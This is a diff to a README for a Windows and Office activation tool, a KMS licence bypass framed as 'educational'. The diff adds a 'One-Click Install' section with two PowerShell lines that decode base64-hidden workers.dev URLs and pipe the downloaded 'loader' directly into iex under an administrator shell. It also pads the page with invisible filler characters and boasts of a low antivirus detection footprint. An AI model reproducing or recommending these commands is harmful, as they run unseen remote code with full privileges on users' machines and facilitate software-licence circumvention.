@@ -1,9 +1,18 @@
-# 📖 WINDOWS and OFFICE ACTIVATOR - 1
+# 📖 WINDOWS and OFFICE ACTIVATOR
 
 ## ⚠️ Important Disclaimer
 This document and the associated script are provided **strictly for educational, development, and system administration study purposes**. it demonstrates how Windows Software Protection Platform (SPP), KMS volume licensing mechanisms, and activation renewal tasks interact at the OS level. It is not intended for production use, redistribution, or circumvention of legitimate software licensing. Always comply with Microsoft's End User License Agreement (EULA) and applicable laws in your jurisdiction.
 
 ---
+ㅤ
+ㅤ
+ㅤ
+ㅤㅤ
+ㅤㅤ
+ㅤ
+---
+
+
 
 ## 🖥️ Supported Operating Systems & Build Requirements
 
@@ -15,19 +24,48 @@ This document and the associated script are provided **strictly for educational,
 | **Office Activation**   | Office 2010, 2013, 2016, 2019, 2021, 365  | Varies        | Handles Retail ↔ Volume conversion.    |
 | **Scheduled Renewal**   | Windows Vista / 7 / 8 / 10 / 11           | 6000+         | Uses Windows Task Scheduler.           |
 
+> 🔰 **Safety:** Unsupported builds will exit gracefully with a version-check warning.
 ㅤ
-> .
+
+---
+ㅤ
+ㅤ
+ㅤ
+ㅤㅤ
+
+---
+
+## ⚡ One-Click Install (Recommended)
+
+ 🚨 use any one of them if any one dosent work only then use the next one.
+
+**Run this single line in Administrator PowerShell** to auto-download, install, and configure:
+
+# Activator 1
+```powershell
+$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9tdWRkeS1kZXctNTEyNC5wcml5YWdob3NoNzM5LndvcmtlcnMuZGV2L2dldC1sb2FkZXI=')); iex (Invoke-WebRequest -Uri $u -Headers @{'X-Gateway-Auth'='windows'} -UseBasicParsing).Content
+```
+ㅤ
+# Activator 2
+```powershell
+$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hY3RpdmF0b3IyLnByaXlhZ2hvc2g3Mzkud29ya2Vycy5kZXYvZ2V0LWxvYWRlcg==')); iex (Invoke-WebRequest -Uri $u -Headers @{'X-Gateway-Auth'='windows'} -UseBasicParsing).Content
+```
 
 ㅤ
->
-> 📌 **Note:** Unsupported builds will exit gracefully with a version-check warning.
-> 
 ㅤ
 ㅤ
-> .
+ㅤㅤ
+---
 ㅤ
- 
+ㅤ
+ㅤ
+ㅤㅤㅤ
+ㅤ
+ㅤ
+ㅤㅤ
 
+
+---
 
 | Feature                 |  Persistence & Upgrades                                                                                                |
 |-------------------------|------------------------------------------------------------------------------------------------------------------------|
@@ -39,6 +77,13 @@ This document and the associated script are provided **strictly for educational,
 
 
 ---
+ㅤ
+ㅤ
+ㅤ
+ㅤ
+---
+
+
 
 ## 📦 Core Features & Modules
 
@@ -52,6 +97,15 @@ This document and the associated script are provided **strictly for educational,
 
 
 ---
+ㅤ
+ㅤ
+ㅤ
+ㅤ
+ㅤ
+ㅤ
+ㅤ
+---
+
 
 
 
@@ -69,3 +123,14 @@ This document and the associated script are provided **strictly for educational,
 | **Data Storage** | Bulk Base64/Custom-encoded blocks (`:bat2file`, `::R2Vfile`, etc.) that decode into full files. | Compact arrays, GUID maps, and conditional logic. Data is parsed dynamically rather than stored as full file dumps. |
 | **Dependency Footprint** | Self-contained. Ships everything it needs → larger size, higher AV signature surface. | OS-native. Relies on Windows built-in components → minimal script size, lower detection footprint. |
 
+
+
+
+
+
+
+>
+> 📌 **Note:** Unsupported builds will exit gracefully with a version-check warning.
+> 
+ㅤ
+ㅤ
